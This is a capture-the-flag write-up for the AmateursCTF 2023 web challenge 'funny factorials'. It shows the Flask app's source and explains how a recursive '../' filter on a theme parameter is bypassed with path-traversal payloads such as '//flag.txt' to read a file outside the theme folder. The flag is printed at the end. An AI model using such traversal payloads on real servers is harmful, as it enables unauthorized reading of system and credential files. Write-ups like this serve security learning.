# AmateursCTF 2023

## funny factorials

> I made a factorials app! It's so fancy and shmancy. However factorials don't seem to properly compute at big numbers! Can you help me fix it?
>
>  Author: stuxf
>
> [`app.py`](app.py) [`Dockerfile`](Dockerfile)

Tags: _web_

## Solution
A simple web application is given that can calculate factorials. The source code is also available, there are two routes.

```javascript
@app.route('/')
def index():
    safe_theme = filter_path(request.args.get("theme", "themes/theme1.css"))
    f = open(safe_theme, "r")
    theme = f.read()
    f.close()
    return render_template('index.html', css=theme)

@app.route('/', methods=['POST'])
def calculate_factorial():
    safe_theme = filter_path(request.args.get("theme", "themes/theme1.css"))

    f = open(safe_theme, "r")
    theme = f.read()
    f.close()
    try:
        num = int(request.form['number'])
        if num < 0:
            error = "Invalid input: Please enter a non-negative integer."
            return render_template('index.html', error=error, css=theme)
        result = factorial(num)
        return render_template('index.html', result=result, css=theme)
    except ValueError:
        error = "Invalid input: Please enter a non-negative integer."
        return render_template('index.html', error=error, css=theme)
```

The actual input form for numbers is not too interesting, but there is a theme switcher that looks like an `lfi` vulnerability because the filename for the theme is passed as parameter `https://funny-factorials.amt.rs/?theme=themes/theme2.css`. The path is filtered to avoid navigating outside the `theme` folder.

```javascript
def filter_path(path):
    # print(path)
    path = path.replace("../", "")
    try:
        return filter_path(path)
    except RecursionError:
        # remove root / from path if it exists
        if path[0] == "/":
            path = path[1:]
        print(path)
        return path
```

So passing `/flag.txt` directly is not working also navigating backwards by `../../flag.txt` will be filtered. The filter can be bypassed though by giving `?theme=..///flag.txt` or simply passing `//flag.txt`. And here we go, the flag is revealed.

```html
<!-- inline styles passed into the template -->
<style>
    amateursCTF{h1tt1ng_th3_r3curs10n_l1mt_1s_1mp0ssibl3}
</style>
```

Flag `amateursCTF{h1tt1ng_th3_r3curs10n_l1mt_1s_1mp0ssibl3}`